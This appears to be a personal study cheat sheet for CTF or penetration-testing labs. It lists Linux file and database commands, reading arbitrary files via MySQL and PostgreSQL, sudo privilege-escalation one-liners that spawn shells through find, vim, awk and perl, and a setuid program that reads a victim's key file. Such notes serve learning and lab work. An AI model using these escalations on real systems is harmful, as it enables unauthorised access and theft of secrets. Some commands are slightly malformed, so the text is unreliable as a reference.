
## Day 1
#### find /dir -type f-name name -exec grep -H '^keyword' {} \;

### Decompressing files
#### tar -xjf file.tbz
#### tar -xzf file.tgz
#### bunzip2 file.bz2

### Encrypting and Decrypting files with openssl
https://robertheaton.com/2013/07/29/padding-oracle-attack/
#### openssl enc -d -aes256 -k KEY -in enc.tgz.enc -out out.tgz

#### Data stays longer in /var/tmp then /tmp dir

### Cronjobs
Never leave credentials in cron jobs.

<!-- $1 = md5crypt $5 = sha256 $6 = sha512 -->
### See services runing in a system
#### ps -edf

### Intresting Directory
#### /var/lib/mysql/mysql

### Read arbitary file when logged in as mysql using load_file() function
#### SELECT LOAD_FILE('/var/lib/password.txt');

### Postgresql 
#### psql 

| List Database | Connect To Database | List Tables | Read Data from Tables | Create Table |
| ---|---| --- | --- | --- |
| \list | \c database_name | \d | SELECT * FROM table_name; | CREATE TABLE tname(column data); |

| Copy Arbitary File to Table | DELETE TABLE |
| --- | --- |
| COPY tname '/etc/passwd'; | DROP TABLE tname; |

### Sqlite 
Poratble Database
|List Tables| Read Data From Table |
|---| -- |
|.tables| SELECT * FROM tablename;|

### Privilege Escalation abusing find command
##### sudo -u user find /etc -name passwd -type f -exec bash \;
##### sudo -u user find /usr/bin -name password.txt -type f -exec cat {} \;

### Privilege Escalation abusing vim
##### sudo -u user vim -c ':!/bin/sh'

### Privilege Escalation abusing awk
##### sudo -u user awk 'BEGIN {system("/bin/bash")}'
##### sudo -u user awk {'print $1'} ~/flag.txt

### Privilege Escalation abusing perl
#### sudo -u user perl -e 'exec "/bin/sh";'
#### sudo -u user perl -e 'print `cat flag.txt`'

### Privilege Escalation with cp and chmod
#### Copy the /bin/bash to /tmp/test
#### chmod +xs /tmp/test && ./test
#### $test
#### Create following file hello :
int main (void)
{
system("cat /home/victim/key.txt");
}

#### sudo -u user cp hello /tmp/test
#### sudo -u user chmod +xs /tmp/test && ./test
### Create wordlist for testing opensource projects
#### find | sed 's/\.//g' > ffufwordlist.txt

